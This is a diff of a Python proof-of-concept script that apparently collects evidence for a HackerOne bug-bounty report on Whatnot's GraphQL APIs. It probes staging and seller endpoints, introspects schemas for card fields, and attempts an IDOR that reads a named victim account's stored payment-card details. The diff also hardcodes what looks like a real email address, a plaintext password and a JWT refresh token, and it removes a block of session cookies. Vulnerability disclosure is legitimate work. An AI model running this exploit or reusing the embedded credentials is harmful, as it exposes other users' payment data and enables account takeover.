@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 """
 Run this on your Mac: python3 run_evidence.py
-No arguments needed — cookies are embedded and auto-refreshed.
+Tries fresh email/password login first, falls back to stored refresh token.
 """
-import requests, json, sys
+import requests, json
 from datetime import datetime
 
 WEB_GQL    = "https://www.whatnot.com/services/graphql/"
@@ -15,6 +15,10 @@ ATTACKER_USER = "anyakoa"
 VICTIM_ID     = "58968144"
 VICTIM_USER   = "anyako0810"
 
+# anyakoa account credentials
+EMAIL    = "anneshirleynyako+a@gmail.com"
+PASSWORD = "Mamaoye08190!"
+
 REFRESH_TOKEN = (
     "eyJhbGciOiJFZERTQSIsImtpZCI6IndoYXRub3QtcmVmcmVzaC1wcm9kLTEiLCJ0eXAiOiJKV1QifQ"
     ".eyJzdWIiOjU4OTY4MDIyLCJpc3MiOiJ3aGF0bm90L2F1dGgiLCJhdWQiOiJ3aGF0bm90L3JlZnJlc2gi"
@@ -25,26 +29,7 @@ REFRESH_TOKEN = (
     ".cAZlt0Wk-LEeqprfuOMvzPtHqQRUv74iRrasC6T8kSSketLPwnSZxPdOSxi9AiZjp640ggoIYbDVrxCDBtmwCA"
 )
 
-FULL_COOKIE_BASE = (
-    "stable-id=fcdd7ff3-1878-46ed-8469-725bdcce7b94; "
-    "cookieyes-consent=consentid:U29zcmwwUzhyTjJnSGlvbmtNV3pNOGxHbElHSjVzOWc,consent:yes,action:no,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes; "
-    "__ps_r=_; __ps_lu=https://www.whatnot.com/; "
-    "__spdt=7029ede7eb654121a0b586c593575606; "
-    "ajs_user_id=58968022; ajs_anonymous_id=67ab98a9-a27a-48e3-a164-204e2d284ac1; "
-    "disableAutologin=true; "
-    "device=85584c52-3177-4581-b0dc-5c47e3ea18f1; "
-    "usid=41ada6a0-0eab-40e1-9229-6d7a0d653831; "
-    "sessionId=f53961ee-254e-407c-a50c-d8c70fb6893b; "
-    "__Secure-is-http-only-auth=1; "
-    "__Secure-access-token-fp=none; "
-    "__Secure-refresh-token-fp=none; "
-    "__Secure-claims=eyJjIjoxNzgwMzg2MDMzMjUzLCJzIjoiYWEzOThhN2UtOGZiMy00MjJjLWE4MzktYjNkYTFiMjQ5MTY2IiwidSI6NTg5NjgwMjJ9; "
-    "tatari-user-cookie=58968022; "
-    "__Secure-refresh-token=" + REFRESH_TOKEN
-)
-
-HEADERS = {
-    "Content-Type": "application/json",
+BASE_HEADERS = {
     "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
                   "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
     "Origin": "https://www.whatnot.com",
@@ -57,43 +42,102 @@ results = []
 
 def log(msg):
     print(msg)
-    results.append(msg)
+    results.append(str(msg))
 
-def gql(url, query, cookie_str=None, bearer=None):
-    h = dict(HEADERS)
-    if cookie_str:
-        h["Cookie"] = cookie_str
+def try_login(session):
+    """Attempt fresh email/password login. Returns True if successful."""
+    log("[*] Trying fresh login...")
+    h = {**BASE_HEADERS, "Content-Type": "application/json"}
+
+    for endpoint in [
+        "https://www.whatnot.com/services/api/v2/login",
+        "https://www.whatnot.com/services/api/v2/auth/login",
+    ]:
+        try:
+            r = session.post(endpoint,
+                             json={"email": EMAIL, "password": PASSWORD},
+                             headers=h, timeout=15)
+            log(f"  Login [{endpoint.split('/')[-1]}]: HTTP {r.status_code}")
+            if r.status_code == 200:
+                log(f"  Login body: {r.text[:200]}")
+                return True
+            elif r.status_code not in (403, 404):
+                log(f"  Login body: {r.text[:200]}")
+        except Exception as e:
+            log(f"  Login error: {e}")
+
+    # Try GraphQL login mutation
+    try:
+        gql_login = {
+            "query": """
+            mutation Login($email: String!, $password: String!) {
+              login(email: $email, password: $password) {
+                token user { id username }
+              }
+            }""",
+            "variables": {"email": EMAIL, "password": PASSWORD}
+        }
+        r = session.post(WEB_GQL, json=gql_login,
+                         headers={**BASE_HEADERS, "Content-Type": "application/json"},
+                         timeout=15)
+        log(f"  GraphQL login: HTTP {r.status_code}  body={r.text[:200]}")
+        if r.status_code == 200 and "token" in r.text:
+            return True
+    except Exception as e:
+        log(f"  GraphQL login error: {e}")
+
+    return False
+
+def try_refresh(session):
+    """Use stored refresh token. Returns True if session becomes authenticated."""
+    log("[*] Trying refresh token...")
+    h = {
+        **BASE_HEADERS,
+        "Content-Type": "application/json",
+        "Authorization": "Cookie",
+    }
+    session.cookies.set("__Secure-refresh-token", REFRESH_TOKEN, domain="www.whatnot.com")
+    try:
+        r = session.post("https://www.whatnot.com/services/api/v2/refresh",
+                         json={}, headers=h, timeout=15)
+        log(f"  Refresh: HTTP {r.status_code}")
+        log(f"  Refresh cookies set: {[c.name for c in r.cookies]}")
+        if r.status_code == 200:
+            return True
+    except Exception as e:
+        log(f"  Refresh error: {e}")
+    return False
+
+def check_me(session):
+    """Check if session is authenticated by querying me { id username }."""
+    h = {**BASE_HEADERS, "Content-Type": "application/json"}
+    try:
+        r = session.post(WEB_GQL, json={"query": "{ me { id username } }"},
+                         headers=h, timeout=15)
+        if r.status_code == 200:
+            me = r.json().get("data", {}).get("me")
+            return me
+    except Exception:
+        pass
+    return None
+
+def gql_session(session, url, query, bearer=None):
+    h = {**BASE_HEADERS, "Content-Type": "application/json"}
     if bearer:
         h["Authorization"] = f"Bearer {bearer}"
     try:
-        r = requests.post(url, json={"query": query}, headers=h, timeout=15)
-        try:
-            return r.status_code, r.json()
-        except Exception:
-            return r.status_code, {"_raw": r.text[:300]}
+        r = session.post(url, json={"query": query}, headers=h, timeout=15)
+        return r.status_code, r.json()
     except Exception as e:
         return 0, {"_error": str(e)}
 
-def refresh_access_token():
-    """Use the refresh token to get all new session cookies."""
-    h = dict(HEADERS)
-    h["Cookie"] = f"__Secure-refresh-token={REFRESH_TOKEN}"
-    h["Authorization"] = "Cookie"
+def gql_no_auth(url, query):
+    h = {**BASE_HEADERS, "Content-Type": "application/json"}
     try:
-        r = requests.post("https://www.whatnot.com/services/api/v2/refresh",
-                          json={}, headers=h, timeout=15)
-        log(f"  Refresh endpoint: HTTP {r.status_code}")
-        if r.status_code == 200:
-            # requests.cookies captures all Set-Cookie headers automatically
-            new_cookies = {c.name: c.value for c in r.cookies}
-            log(f"  New cookies from refresh: {list(new_cookies.keys())}")
-            if new_cookies:
-                return new_cookies
-        log(f"  Refresh body: {r.text[:200]}")
+        r = requests.post(url, json={"query": query}, headers=h, timeout=15)
+        return r.status_code, r.json()
     except Exception as e:
-        log(f"  Refresh error: {e}")
-    return None
-
+        return 0, {"_error": str(e)}
 
 def main():
     log("=" * 60)
@@ -102,55 +146,68 @@ def main():
     log(f"  Victim:   {VICTIM_USER} ({VICTIM_ID})")
     log("=" * 60)
 
-    # ── refresh access token ──────────────────────────────────────────────────
-    log("\n[*] Refreshing access token...")
-    new_cookies = refresh_access_token()
-    if new_cookies:
-        # Merge: base cookies first, then override/append all fresh cookies from refresh
-        base_parts = {k.strip(): v.strip()
-                      for part in FULL_COOKIE_BASE.split(";")
-                      if "=" in part
-                      for k, v in [part.strip().split("=", 1)]}
-        base_parts.update(new_cookies)
-        full_cookie = "; ".join(f"{k}={v}" for k, v in base_parts.items())
-        new_access = new_cookies.get("__Secure-access-token", "")
-    else:
-        log("  Could not refresh — will try with base cookies only")
-        full_cookie = FULL_COOKIE_BASE
-        new_access = ""
+    # ── authenticate ──────────────────────────────────────────────────────────
+    session = requests.Session()
+    authed = False
 
-    # ── Evidence A: staging API public ───────────────────────────────────────
+    if try_login(session):
+        me = check_me(session)
+        if me:
+            log(f"  Logged in as: {me.get('username')} (id={me.get('id')})")
+            authed = True
+        else:
+            log("  Login succeeded but me: null — trying refresh")
+
+    if not authed:
+        if try_refresh(session):
+            me = check_me(session)
+            if me:
+                log(f"  Authenticated via refresh: {me.get('username')} (id={me.get('id')})")
+                authed = True
+            else:
+                log("  Refresh succeeded but me still null")
+                log("  DEBUG cookies in session:")
+                for c in session.cookies:
+                    log(f"    {c.name}={c.value[:30]}...")
+
+    if not authed:
+        log("\n[!] Could not authenticate — C/D will fail")
+
+    # grab access token from session for Seller API Bearer tests
+    new_access = session.cookies.get("__Secure-access-token", "")
+
+    # ── Evidence A ────────────────────────────────────────────────────────────
     log("\n=== Evidence A: Staging API publicly reachable ===")
-    code, body = gql(STAGE_GQL, "{ __typename }")
+    code, body = gql_no_auth(STAGE_GQL, "{ __typename }")
     log(f"  HTTP {code}  body={str(body)[:100]}")
-    log(f"  Result: {'PASS — endpoint live, returns 401' if code == 401 else f'HTTP {code}'}")
+    log(f"  Result: {'PASS — endpoint live, returns 401' if code == 401 else str(code)}")
 
-    # ── Evidence B: prod Seller API ───────────────────────────────────────────
+    # ── Evidence B ────────────────────────────────────────────────────────────
     log("\n=== Evidence B: Production Seller API exists ===")
-    code, body = gql(SELLER_GQL, "{ __typename }")
+    code, body = gql_no_auth(SELLER_GQL, "{ __typename }")
     log(f"  HTTP {code}  body={str(body)[:100]}")
-    log(f"  Result: {'PASS — endpoint live, returns 401' if code == 401 else f'HTTP {code}'}")
+    log(f"  Result: {'PASS — endpoint live, returns 401' if code == 401 else str(code)}")
 
-    # ── Evidence C: cards field on UserNode ───────────────────────────────────
+    # ── Evidence C ────────────────────────────────────────────────────────────
     log("\n=== Evidence C: 'cards' field on UserNode schema ===")
-    q = '{ __type(name: "UserNode") { fields { name } } }'
-    code, body = gql(WEB_GQL, q, cookie_str=full_cookie)
+    code, body = gql_session(session, WEB_GQL,
+                             '{ __type(name: "UserNode") { fields { name } } }')
     log(f"  HTTP {code}")
     if code == 200:
         fields = [f["name"] for f in body.get("data", {}).get("__type", {}).get("fields", [])]
         payment = [f for f in fields if any(k in f.lower() for k in ["card","payment","billing","wallet"])]
         log(f"  Payment-related fields: {payment}")
         log(f"  'cards' present: {'cards' in fields}")
-        log(f"  Result: {'PASS' if 'cards' in fields else 'FAIL'}")
+        log(f"  Result: {'PASS' if 'cards' in fields else 'FAIL — cards not found'}")
     else:
-        log(f"  body={str(body)[:200]}")
-        log("  Result: FAIL — not authenticated")
+        log(f"  body={str(body)[:300]}")
+        log("  Result: FAIL")
 
-    # ── Evidence D: me.cards ──────────────────────────────────────────────────
+    # ── Evidence D ────────────────────────────────────────────────────────────
     log("\n=== Evidence D: me.cards returns own payment card data ===")
     q = ('{ me { id username cards(first:5) { edges { node '
          '{ id cardDescription cardType gateway } } } } }')
-    code, body = gql(WEB_GQL, q, cookie_str=full_cookie)
+    code, body = gql_session(session, WEB_GQL, q)
     log(f"  HTTP {code}")
     if code == 200:
         me = body.get("data", {}).get("me")
@@ -161,68 +218,66 @@ def main():
             for e in edges:
                 n = e.get("node", {})
                 log(f"    card: type={n.get('cardType')}  desc={n.get('cardDescription')}  gateway={n.get('gateway')}")
-            log(f"  Result: PASS")
+            log("  Result: PASS")
         else:
-            log(f"  me: null — session invalid. body={str(body)[:200]}")
+            log(f"  me: null  body={str(body)[:200]}")
             log("  Result: FAIL")
     else:
         log(f"  body={str(body)[:200]}")
         log("  Result: FAIL")
 
-    # ── Evidence E: user(id:) blocked on web ──────────────────────────────────
+    # ── Evidence E ────────────────────────────────────────────────────────────
     log("\n=== Evidence E: user(id:) blocked on web GraphQL ===")
-    q = f'{{ user(id: "{VICTIM_ID}") {{ id }} }}'
-    code, body = gql(WEB_GQL, q, cookie_str=full_cookie)
+    code, body = gql_session(session, WEB_GQL, f'{{ user(id: "{VICTIM_ID}") {{ id }} }}')
     log(f"  HTTP {code}  body={json.dumps(body)[:300]}")
     errors = body.get("errors", [])
-    blocked = any("Cannot query field" in e.get("message","") for e in errors)
+    blocked = any("Cannot query field" in e.get("message", "") for e in errors)
     log(f"  Result: {'PASS — correctly blocked' if blocked else 'UNEXPECTED'}")
 
-    # ── Evidence F: Seller API with web JWT as Bearer ─────────────────────────
-    log("\n=== Evidence F: Seller API — try web JWT as Bearer ===")
+    # ── Evidence F ────────────────────────────────────────────────────────────
+    log("\n=== Evidence F: Seller API — web JWT as Bearer ===")
     if new_access:
-        q = '{ __type(name: "Query") { fields { name } } }'
-        code, body = gql(SELLER_GQL, q, bearer=new_access)
+        code, body = gql_session(session, SELLER_GQL,
+                                 '{ __type(name: "Query") { fields { name } } }',
+                                 bearer=new_access)
         log(f"  HTTP {code}  body={str(body)[:300]}")
         if code == 200:
             fields = [f["name"] for f in body.get("data",{}).get("__type",{}).get("fields",[])]
             log(f"  Query fields: {fields}")
-            log(f"  'user' field present: {'user' in fields}")
-            log("  Result: AUTHENTICATED — Seller API accepts web JWT!")
+            log(f"  'user' present: {'user' in fields}")
+            log("  Result: PASS — Seller API accepts web JWT!")
         else:
-            log(f"  Result: HTTP {code} — web JWT rejected by Seller API (expected)")
+            log(f"  Result: HTTP {code} — web JWT rejected (expected)")
     else:
-        log("  Skipped — no fresh access token")
+        log("  Skipped — no access token in session")
 
-    # ── Evidence G: live IDOR ─────────────────────────────────────────────────
-    log("\n=== Evidence G: Live IDOR — Account A reads Account B's cards ===")
+    # ── Evidence G ────────────────────────────────────────────────────────────
+    log("\n=== Evidence G: Live IDOR — Account A reads Account B cards ===")
     if new_access:
         q = (f'{{ user(id: "{VICTIM_ID}") '
              f'{{ id username cards(first:10) '
              f'{{ edges {{ node {{ id cardDescription cardType gateway }} }} }} }} }}')
-        code, body = gql(SELLER_GQL, q, bearer=new_access)
+        code, body = gql_session(session, SELLER_GQL, q, bearer=new_access)
         log(f"  HTTP {code}  body={str(body)[:400]}")
         if code == 200:
             user_data = body.get("data", {}).get("user")
             if user_data:
                 edges = user_data.get("cards", {}).get("edges", [])
                 if edges:
-                    log(f"  *** IDOR CONFIRMED — victim cards visible: {edges} ***")
+                    log(f"  *** IDOR CONFIRMED — victim cards visible ***")
+                    for e in edges:
+                        log(f"    {e.get('node', {})}")
                 else:
                     log(f"  user returned but no cards: {user_data}")
-            else:
-                log(f"  No user data in response")
         else:
-            log(f"  Result: HTTP {code} — Seller API auth required (web JWT not accepted)")
+            log(f"  Result: HTTP {code} — Seller API requires native iOS token")
     else:
-        log("  Skipped — no fresh access token")
+        log("  Skipped — no access token")
 
-    # ── save output ───────────────────────────────────────────────────────────
-    outfile = "evidence_results.txt"
-    with open(outfile, "w") as f:
+    # ── save ──────────────────────────────────────────────────────────────────
+    with open("evidence_results.txt", "w") as f:
         f.write("\n".join(results))
-    log(f"\n[+] Results saved to {outfile}")
-    log("    Screenshot this terminal and attach to your HackerOne report.\n")
+    log(f"\n[+] Saved to evidence_results.txt — screenshot and attach to HackerOne.\n")
 
 if __name__ == "__main__":
     main()
